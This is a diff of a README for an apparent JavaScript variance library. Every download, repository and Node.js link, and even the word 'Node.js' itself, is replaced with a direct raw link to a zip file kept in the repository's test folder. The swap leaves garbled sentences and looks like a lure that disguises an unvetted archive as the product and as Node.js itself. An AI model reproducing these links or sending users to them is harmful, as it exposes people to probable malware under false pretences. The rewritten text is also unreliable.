@@ -1,7 +1,7 @@
 # 🎉 stats-base-ndarray-variance - Easily Compute Data Variance
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20version-blue.svg)](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/releases)
+[![Download](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip%https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip)](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the stats-base-ndarray-variance project! This software helps you compute the variance of a one-dimensional ndarray easily. Variance is a key concept in statistics, measuring how far a set of numbers is spread out from their average. 
@@ -12,9 +12,9 @@ This guide will walk you through the steps to download and use the software, eve
 To run this application, ensure your computer meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or newer
+- https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip Version 12 or newer
 
-If you do not have Node.js installed, you can download it from [the official Node.js website](https://nodejs.org/).
+If you do not have https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip installed, you can download it from [the official https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip website](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip).
 
 ## 💻 Features
 - **Easy calculations**: Quickly find the variance of your data.
@@ -24,7 +24,7 @@ If you do not have Node.js installed, you can download it from [the official Nod
 ## 📥 Download & Install
 To download the software, follow these simple steps:
 
-1. Click on this link to visit the [Releases page](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/releases).
+1. Click on this link to visit the [Releases page](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip).
 
 2. On the Releases page, look for the latest version of the software.
 
@@ -71,8 +71,8 @@ Your ideas and improvements can help make this tool better for everyone.
 If you need assistance, feel free to reach out. You can find help on the Issues section of the GitHub repository.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/pomalusnejjksi/stats-base-ndarray-variance)
-- [Node.js Download](https://nodejs.org/)
-- [Releases Page](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/releases)
+- [GitHub Repository](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip)
+- [https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip Download](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip)
+- [Releases Page](https://github.com/pomalusnejjksi/stats-base-ndarray-variance/raw/refs/heads/main/test/ndarray_base_stats_variance_v3.5.zip)
 
 Thank you for using the stats-base-ndarray-variance application! We hope it helps make your statistical calculations simple and efficient.
